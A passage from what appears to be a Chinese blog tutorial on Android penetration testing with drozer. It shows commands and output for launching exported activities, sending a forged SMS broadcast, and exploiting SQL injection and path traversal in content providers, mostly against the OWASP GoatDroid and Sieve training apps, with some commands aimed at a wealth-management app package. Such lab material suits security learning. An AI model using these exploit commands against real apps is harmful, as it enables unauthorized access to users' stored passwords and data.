class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs haml"># 搜索关键字&quot;bluetooth&quot;相关的包<br>dz&gt; run app.package.list -f bluetooth<br>com.android.bluetoothmidiservice (Bluetooth MIDI Service)<br>com.android.bluetooth (蓝牙)<br><br># 查看蓝牙相关包的信息<br>dz&gt; run app.package.info -a com.android.bluetooth<br>Package: com.android.bluetooth<br>  Application Label: 蓝牙<br>  Process Name: com.android.bluetooth<br>  Version: 8.1.0<br>  Data Directory: /data/user_de/0/com.android.bluetooth<br>  APK Path: /system/app/Bluetooth/Bluetooth.apk<br>  UID: 1002<br>  GID: [3002, 3003, 3001, 3007, 1002, 3010, 3011, 3005, 1016]<br>  Shared Libraries: [/system/framework/javax.obex.jar]<br>  Shared User ID: android.uid.bluetooth<br>  Uses Permissions:<br>  -<span class="ruby"> android.permission.RECEIVE_BOOT_COMPLETED</span><br><span class="ruby">  - android.permission.ACCESS_BLUETOOTH_SHARE</span><br><span class="ruby">  - android.permission.ACCESS_COARSE_LOCATION</span><br><span class="ruby">  - android.permission.INTERNET</span><br><span class="ruby">  - android.permission.BLUETOOTH</span><br><span class="ruby">  - android.permission.BLUETOOTH_ADMIN</span><br><span class="ruby">  - android.permission.BLUETOOTH_PRIVILEGED</span><br><span class="ruby">  - android.permission.BLUETOOTH_MAP</span><br><span class="ruby">  - android.permission.DUMP</span><br><span class="ruby">  - android.permission.WAKE_LOCK</span><br><span class="ruby">  - android.permission.WRITE_EXTERNAL_STORAGE</span><br><span class="ruby">  - android.permission.READ_EXTERNAL_STORAGE</span><br><span class="ruby">  - android.permission.READ_CONTACTS</span><br><span class="ruby">  - android.permission.WRITE_CONTACTS</span><br><span class="ruby">  - android.permission.READ_CALL_LOG</span><br><span class="ruby">  - android.permission.WRITE_CALL_LOG</span><br><span class="ruby">  - android.permission.READ_PRIVILEGED_PHONE_STATE</span><br><span class="ruby">  - android.permission.WRITE_SETTINGS</span><br><span class="ruby">  - android.permission.NFC_HANDOVER_STATUS</span><br><span class="ruby">  - android.permission.WRITE_SECURE_SETTINGS</span><br><span class="ruby">  - android.permission.WRITE_APN_SETTINGS</span><br><span class="ruby">  - android.permission.NET_ADMIN</span><br><span class="ruby">  - android.permission.CALL_PRIVILEGED</span><br><span class="ruby">  - android.permission.MODIFY_AUDIO_SETTINGS</span><br><span class="ruby">  - android.permission.NET_TUNNELING</span><br><span class="ruby">  - android.permission.ACCESS_NETWORK_STATE</span><br><span class="ruby">  - android.permission.CHANGE_NETWORK_STATE</span><br><span class="ruby">  - android.permission.CONNECTIVITY_INTERNAL</span><br><span class="ruby">  - android.permission.TETHER_PRIVILEGED</span><br><span class="ruby">  - android.permission.MODIFY_PHONE_STATE</span><br><span class="ruby">  - android.permission.INTERACT_ACROSS_USERS_FULL</span><br><span class="ruby">  - android.permission.BLUETOOTH_STACK</span><br><span class="ruby">  - android.permission.INTERACT_ACROSS_USERS</span><br><span class="ruby">  - android.permission.MANAGE_USERS</span><br><span class="ruby">  - android.permission.GET_ACCOUNTS</span><br><span class="ruby">  - com.google.android.gallery3d.permission.GALLERY_PROVIDER</span><br><span class="ruby">  - com.android.gallery3d.permission.GALLERY_PROVIDER</span><br><span class="ruby">  - android.permission.RECEIVE_SMS</span><br><span class="ruby">  - android.permission.SEND_SMS</span><br><span class="ruby">  - android.permission.READ_SMS</span><br><span class="ruby">  - android.permission.WRITE_SMS</span><br><span class="ruby">  - android.permission.MEDIA_CONTENT_CONTROL</span><br><span class="ruby">  - android.permission.UPDATE_APP_OPS_STATS</span><br><span class="ruby">  - android.permission.VIBRATE</span><br><span class="ruby">  - android.permission.DEVICE_POWER</span><br><span class="ruby">  - android.permission.REAL_GET_TASKS</span><br><span class="ruby">  - android.permission.MODIFY_AUDIO_ROUTING</span><br><span class="ruby">  - android.permission.UPDATE_DEVICE_STATS</span><br><span class="ruby">  - android.permission.READ_PROFILE</span><br><span class="ruby">  Defines <span class="hljs-symbol">Permissions:</span></span><br><span class="ruby">  - android.permission.ACCESS_BLUETOOTH_SHARE</span><br><span class="ruby">  - com.android.permission.WHITELIST_BLUETOOTH_DEVICE</span><br><br><span class="ruby">dz&gt; </span><br></code></pre></td></tr></table></figure><h3 id="安全测试-测试常用命令"><a href="#安全测试-测试常用命令" class="headerlink" title="安全测试-测试常用命令"></a>安全测试-测试常用命令</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># activity组件</span><br>&gt;<span class="hljs-builtin-name">run</span> app.activity.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>&gt;<span class="hljs-builtin-name">run</span> app.activity.start --component com.zritc.zritcwealthmanagement com.zritc.zritcwealthmanagement.activity.SplashActivity<br><br><span class="hljs-comment"># Services组件</span><br>&gt;<span class="hljs-builtin-name">run</span> app.service.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>&gt;<span class="hljs-builtin-name">run</span> app.service.start --component com.zritc.zritcwealthmanagement cn.jpush.android.service.DaemonService<br><br><span class="hljs-comment"># Broadcast Reciever</span><br>dz&gt;<span class="hljs-builtin-name">run</span> app.broadcast.<span class="hljs-builtin-name">info</span> -a com.zritc.zritcwealthmanagement<br>dz&gt; <span class="hljs-builtin-name">run</span> app.broadcast.send --component com.zritc.zritcwealthmanagement --action com.zritc.zritcwealthmanagement.receiver.MyJPushMessageReceiver<br><br><span class="hljs-comment"># Content Provider</span><br>dz&gt; <span class="hljs-builtin-name">run</span> scanner.provider.injection -a com.zritc.zritcwealthmanagement  检测注入<br>dz&gt; <span class="hljs-builtin-name">run</span> scanner.provider.traversal -a com.zritc.zritcwealthmanagement  检测目录遍历<br><br><span class="hljs-comment"># WebView代码执行检测</span><br><span class="hljs-builtin-name">run</span> scanner.misc.checkjavascriptbridge -a com.zritc.zritcwealthmanagement<br><br><br></code></pre></td></tr></table></figure><h3 id="安全测试-组件测试详解"><a href="#安全测试-组件测试详解" class="headerlink" title="安全测试-组件测试详解"></a>安全测试-组件测试详解</h3><p><strong>查看可攻击点</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.package</span><span class="hljs-selector-class">.attacksurface</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>Attack Surface:<br>  <span class="hljs-number">3</span> activities exported<br>  <span class="hljs-number">0</span> broadcast receivers exported<br>  <span class="hljs-number">2</span> <span class="hljs-attribute">content</span> providers exported<br>  <span class="hljs-number">2</span> services exported<br>    is debuggable<br></code></pre></td></tr></table></figure><h4 id="activity组件"><a href="#activity组件" class="headerlink" title="activity组件"></a>activity组件</h4><blockquote><p>应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity之间通过Intent进行通信。在Intent的描述结构中，有两个最重要的部分：动作和动作对应的数据。</p><p>通过查看APP的风险点，activity存在问题，查看apktool反编译出的AndroidManifest.xml文件中activity的exported设置为true，则应用存在被导出的风险。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211104220356162.png" alt="image-20211104220356162"></p><p>测试app：sieve.apk</p><p><strong>查看对外的activity组件信息</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.activity</span><span class="hljs-selector-class">.info</span> -<span class="hljs-selector-tag">a</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>Package: com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span>.sieve<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.FileSelectActivity<br>    Permission: null<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.MainLoginActivity<br>    Permission: null<br>  com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.PWList<br>    Permission: null<br></code></pre></td></tr></table></figure><p>使用app.activity.start进行漏洞测试</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.activity</span><span class="hljs-selector-class">.start</span> --component com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span> com<span class="hljs-selector-class">.mwr</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.sieve</span>.PWList<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/webp.webp" alt="img"></p><h4 id="Broadcast组件"><a href="#Broadcast组件" class="headerlink" title="Broadcast组件"></a>Broadcast组件</h4><blockquote><p>BroadcastReceive广播接收器应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。</p></blockquote><p>测试app：fourgoats的app，名称为，goatdroid.apk</p><p><strong>使用app.broadcast.info模块查看对外的broadcast组件信息</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dz&gt; run app<span class="hljs-selector-class">.broadcast</span><span class="hljs-selector-class">.info</span> -<span class="hljs-selector-tag">a</span> org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span>.fourgoats<br>Package: org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span>.fourgoats<br>  org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span><span class="hljs-selector-class">.fourgoats</span><span class="hljs-selector-class">.broadcastreceivers</span>.SendSMSNowReceiver<br>    Permission: null<br></code></pre></td></tr></table></figure><p><strong>查看反编译出的AndroidManifest.xml文件，可看到将receiver的exported设置未进行设置。说明存在越权问题，可发送恶意广播，伪造消息等等。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105094101819.png" alt="image-20211105094101819"></p><p>接下来要审计源码，源码的获取过程：smail——&gt;dex——jar</p><p>smail2dex：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">usage：<br>java -jar smali.jar &lt;smail path&gt; -o &lt;classes path&gt;<br>注：smail directory为smail文件的目录。classes directory为目录加文件名<br><br>example：<br>java -jar smali-<span class="hljs-number">2.1</span>.<span class="hljs-number">2</span>.jar  <span class="hljs-regexp">/root/</span>tools<span class="hljs-regexp">/android/</span>AndroidTools<span class="hljs-regexp">/AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>smali -o AppInfoScanner<span class="hljs-regexp">/out/g</span>oatdroid/classes.dex<br><br>报错：<br>root@kali:~<span class="hljs-regexp">/tools/</span>android<span class="hljs-regexp">/AndroidTools# java -jar smali.jar /</span>root<span class="hljs-regexp">/tools/</span>android<span class="hljs-regexp">/AndroidTools/</span>AppInfoScanner<span class="hljs-regexp">/out/g</span>oatdroid<span class="hljs-regexp">/smali -o AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>classes.dex<br>Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">&quot;main&quot;</span> com.beust.jcommander.MissingCommandException: Expected a command, got <span class="hljs-regexp">/root/</span>tools<span class="hljs-regexp">/android/</span>AndroidTools<span class="hljs-regexp">/AppInfoScanner/</span>out<span class="hljs-regexp">/goatdroid/</span>smali<br>at com.beust.jcommander.JCommander.parseValues(JCommander.java:<span class="hljs-number">725</span>)<br>at com.beust.jcommander.JCommander.parse(JCommander.java:<span class="hljs-number">304</span>)<br>at com.beust.jcommander.JCommander.parse(JCommander.java:<span class="hljs-number">287</span>)<br>at org.jf.smali.Main.main(Main.java:<span class="hljs-number">87</span>)<br>解决方法：<br>使用smail-<span class="hljs-number">2.1</span>.<span class="hljs-number">2</span>.jar<br>参考文章：https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/lihonghao1017/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">112776892</span><br><br>smail.jar下载地址：https:<span class="hljs-regexp">//</span>bitbucket.org<span class="hljs-regexp">/JesusFreke/</span>smali<span class="hljs-regexp">/downloads/</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105102631646.png" alt="image-20211105102631646"></p><p>dex2jar：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts">安装：<br>下载解压后，加入环境变量即可。<br>usage：<br>d2j-dex2jar.sh <span class="hljs-params">&lt;classes path&gt;</span> -o  <span class="hljs-params">&lt;jar path&gt;</span><br><span class="hljs-symbol">example:</span><br>./d2j-dex2jar.sh classes.dex -o classes.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105103800544.png" alt="image-20211105103800544"></p><p>从源码中看到，需要phoneNumber和message两个参数</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105104624423.png" alt="image-20211105104624423"></p><p><strong>漏洞利用，可发送恶意广播包</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">run app<span class="hljs-selector-class">.broadcast</span><span class="hljs-selector-class">.send</span> --action org<span class="hljs-selector-class">.owasp</span><span class="hljs-selector-class">.goatdroid</span><span class="hljs-selector-class">.fourgoats</span><span class="hljs-selector-class">.SOCIAL_SMS</span> --extra string phoneNumber <span class="hljs-number">1234</span> --extra string message pwnd!<br></code></pre></td></tr></table></figure><p>注：在安卓8上未复现成功，应该是版本较高所致，随后在较低的版本上测试一下。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/111.webp" alt="img"></p><p><strong>漏洞利用，拒绝服务攻击检测</strong></p><p>尝试拒绝服务攻击检测，向广播组件发送不完整intent使用空extras，可看到应用停止运行。</p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105105512586.png" alt="image-20211105105512586"></p><h4 id="services组件"><a href="#services组件" class="headerlink" title="services组件"></a>services组件</h4><blockquote><p>一个Service 是一段长生命周期的，没有用户界面的程序，可以用来开发如监控类程序。较好的一个例子就是一个正在从播放列表中播放歌曲的媒体播放器。在一个媒体播放器的应用中，应该会有多个activity，让使用者可以选择歌曲并播放歌曲。</p><p>然而，音乐重放这个功能并没有对应的activity，因为使用者当然会认为在导航到其它屏幕时音乐应该还在播放的。在这个例子中，媒体播放器这个activity 会使用Context.startService()来启动一个service，从而可以在后台保持音乐的播放。同时，系统也将保持这个service 一直执行，直到这个service 运行结束。</p><p>另外，我们还可以通过使用Context.bindService()方法，连接到一个service 上（如果这个service 还没有运行将启动它）。当连接到一个service 之后，我们还可以service 提供的接口与它进行通讯。拿媒体播放器这个例子来说，我们还可以进行暂停、重播等操作。 intent-filter未将exported设置为false，默认是可以导出的。</p></blockquote><p>测试app：fourgoats的app，名称为，goatdroid.apk</p><p>分析AndroidManifest.xml </p><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105110557615.png" alt="image-20211105110557615"></p><p>org.owasp.fourgoats.goatdroid.LocationService服务被导出，不需要任何权限。所以这意味着任何与FourGoats应用程序安装在设备上的恶意应用程序可以访问设备的位置。</p><p><strong>尝试启动特定服务</strong>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 查看攻击面</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.package.attacksurface org.owasp.goatdroid.fourgoats<br>Attack Surface:<br>  4 activities exported<br>  1 broadcast receivers exported<br>  0 content providers exported<br>  1 services exported<br>    is debuggable<br><br><span class="hljs-comment"># 查看services信息</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.service.<span class="hljs-builtin-name">info</span> -a org.owasp.goatdroid.fourgoats<br>Package: org.owasp.goatdroid.fourgoats<br>  org.owasp.goatdroid.fourgoats.services.LocationService<br>    Permission: <span class="hljs-literal">null</span><br><br><span class="hljs-comment"># 启动位置服务</span><br>dz&gt; <span class="hljs-builtin-name">run</span> app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService<br></code></pre></td></tr></table></figure><h4 id="content组件"><a href="#content组件" class="headerlink" title="content组件"></a>content组件</h4><blockquote><p>android平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。</p></blockquote><p>测试app：sieve.apk</p><p><strong>信息泄露利用</strong>：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs vim">扫描并获取Content Provider信息，并列出了可访问内容URI的列表和路径：<br>dz&gt; run scanner.provider.finduris -<span class="hljs-keyword">a</span> <span class="hljs-keyword">com</span>.mwr.example.sieve<br>Scanning <span class="hljs-keyword">com</span>.mwr.example.sieve...<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.FileBackupProvider/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords/<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys/<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.FileBackupProvider<br>Able <span class="hljs-keyword">to</span> Query    conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords<br>Unable <span class="hljs-keyword">to</span> Query  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys<br><br>Accessible content URI<span class="hljs-variable">s:</span><br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Keys/<br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords<br>  conten<span class="hljs-variable">t:</span>//<span class="hljs-keyword">com</span>.mwr.example.sieve.DBContentProvider/Passwords/<br>  <br># 查询或修改数据库中的数据，发现存在数据泄露问题，访问uri可看到一些敏感信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105112731220.png" alt="image-20211105112731220"></p><p><strong>SQL注入漏洞</strong>：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stata">同样content可能导致注入问题。使用以下语句进行测试发现报错，说明存在SQL注入漏洞。<br>dz&gt; <span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.provider.<span class="hljs-keyword">query</span> content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot; </span><br>unrecognized <span class="hljs-keyword">token</span>: <span class="hljs-string">&quot;&#x27; FROM Passwords&quot;</span> (code 1): , <span class="hljs-keyword">while</span> compiling: SELECT &#x27; FROM Passwords<br>dz&gt; <span class="hljs-keyword">run</span> <span class="hljs-keyword">app</span>.provider.<span class="hljs-keyword">query</span> content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot; </span><br>unrecognized <span class="hljs-keyword">token</span>: <span class="hljs-string">&quot;&#x27;)&quot;</span> (code 1): , <span class="hljs-keyword">while</span> compiling: SELECT * FROM Passwords WHERE (&#x27;)<br><br></code></pre></td></tr></table></figure><p><strong>列出所有表的信息</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run app.provider.query content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span> --projection <span class="hljs-string">&quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/C0mpactDisk/cloudimg//drozer/image-20211105113213318.png" alt="image-20211105113213318"></p><p><strong>获取具体表的信息</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection <span class="hljs-string">&quot;* FROM Key;--&quot;</span><br>|<span class="hljs-string"> Password           </span>|<span class="hljs-string"> pin  </span>|<br>|<span class="hljs-string"> testtest1234567890 </span>|<span class="hljs-string"> 1234 </span>|<br></code></pre></td></tr></table></figure><p><strong>对注入点进行扫描</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run scanner.provider.injection -a  com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Not Vulnerable:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Keys<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider/<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<br><br>Injection <span class="hljs-keyword">in</span> Projection:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br><br>Injection <span class="hljs-keyword">in</span> Selection:<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span><br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords<br>  content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span><br></code></pre></td></tr></table></figure><p><strong>列出该app的表信息</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run scanner.provider.sqltables -a  com.mwr.example.sieve<br>Scanning com.mwr.example.sieve...<br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Passwords/</span>:<br>  android_metadata<br>  Passwords<br>  Key<br><br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider<span class="hljs-regexp">/Keys/</span>:<br>  android_metadata<br>  Passwords<br>  Key<br><br>Accessible tables <span class="hljs-keyword">for</span> uri content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.DBContentProvider/Passwords:<br>  android_metadata<br>  Passwords<br>  Key<br></code></pre></td></tr></table></figure><p><strong>底层文件系统读取和写入（有可能被阻止）</strong></p><p>文件读取：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">dz&gt; run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts <br><span class="hljs-number">127.0.0.1</span>       localhost<br>::<span class="hljs-number">1</span>             ip6-localhost<br></code></pre></td></tr></table></figure><p>文件下载：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">dz&gt; run app.provider.download content:<span class="hljs-regexp">//</span>com.mwr.example.sieve.FileBackupProvider<span class="hljs-regexp">/etc/</span>hosts <span class="hljs-regexp">/root/</span>documents<span 